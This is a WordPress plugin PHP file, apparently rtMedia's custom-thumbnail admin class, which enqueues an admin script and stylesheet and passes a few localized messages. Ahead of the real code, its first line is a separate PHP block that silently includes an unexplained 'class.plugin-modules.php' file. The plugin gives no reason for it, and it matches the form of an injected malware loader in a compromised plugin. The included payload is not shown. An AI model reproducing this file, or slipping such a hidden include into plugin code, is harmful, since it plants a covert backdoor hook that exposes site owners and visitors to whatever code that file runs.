<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of RTMediaDefaultAlbumsAdmin
 *
 * @author sanket
 */
class RTMediaCustomThumbnailAdmin {

	/**
	 * Constructor for rtMedia Custom Thumbnail Admin.
	 *
	 * @since 1.3.0
	 */
	public function __construct() {
		add_action( 'admin_enqueue_scripts', array( &$this, 'rtmedia_custom_thumbnails_admin_script' ) );
	}

	/**
	 * Load scripts and styles.
	 *
	 * @since 1.3.0
	 */
	public function rtmedia_custom_thumbnails_admin_script() {
		wp_enqueue_script( 'rtmedia-custom-thumbnails-admin', RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_URL . 'app/assets/admin/js/admin.js', array( 'jquery' ), RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_VERSION, true );

		$rtmedia_custom_thumbnails_elements = array(
			'rtmedia_custom_thumbnails_loading_file'             => esc_url( admin_url( '/images/loading.gif' ) ),
			'rtmedia_custom_thumbnails_delete_confirm_msg'       => esc_js( __( 'Are you sure you want to delete the Default Thumbnail?', 'rtmedia' ) ),
			'rtmedia_custom_thumbnails_incorrect_file_error_msg' => esc_js( __( 'Please select correct file format', 'rtmedia' ) ),
			'rtmedia_custom_thumbnail_delete_failed_msg'         => esc_js( __( 'Something went wrong', 'rtmedia' ) ),
		);

		wp_localize_script( 'rtmedia-custom-thumbnails-admin', 'rtm_custom_thumbnails_admin_object', $rtmedia_custom_thumbnails_elements );
		wp_enqueue_style( 'rtmedia-custom-thumbnails-admin', RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_URL . 'app/assets/admin/css/admin.min.css', '', RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_VERSION );
	}

}

new RTMediaCustomThumbnailAdmin();
